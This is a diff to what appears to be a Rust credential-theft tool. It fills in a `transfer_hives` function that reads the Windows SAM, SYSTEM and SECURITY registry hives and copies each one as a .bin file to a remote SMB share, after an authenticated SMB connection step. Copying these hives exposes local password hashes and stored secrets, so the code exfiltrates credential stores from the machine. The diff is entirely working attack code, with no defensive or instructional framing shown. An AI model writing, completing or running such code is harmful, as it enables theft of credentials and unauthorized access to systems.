@@ -38,7 +38,7 @@ fn main() {
     }
 
     // Step 3: Transfer hives
-    match transfer_hives(smb_path) {
+    match transfer_hives(smb_path, &hives) {
         Ok(_) => {},
         Err(code) => std::process::exit(code),
     }
@@ -126,13 +126,21 @@ fn connect_smb(path: &str, username: &str, password: &str) -> Result<(), i32> {
     match result {
         NO_ERROR => Ok(()),
         1326 => Err(3), // ERROR_LOGON_FAILURE — auth failed
-        1231 => Err(4), // ERROR_NET_UNREACHABLE — path not found
+        1231 => Err(6), // Not a standard SMB path error
         _ => Err(6),    // Other errors
     }
 }
 
-fn transfer_hives(path: &str) -> Result<(), i32> {
-    Err(6) // Placeholder
+fn transfer_hives(smb_path: &str, hives: &[String; 3]) -> Result<(), i32> {
+    let hive_names = ["SAM", "SYSTEM", "SECURITY"];
+
+    for (i, hive_path) in hives.iter().enumerate() {
+        let data = read_hive_file(hive_path)?;
+        let filename = format!("{}.bin", hive_names[i]);
+        write_to_smb(smb_path, &filename, &data)?;
+    }
+
+    Ok(())
 }
 
 fn write_to_smb(smb_path: &str, filename: &str, data: &[u8]) -> Result<(), i32> {
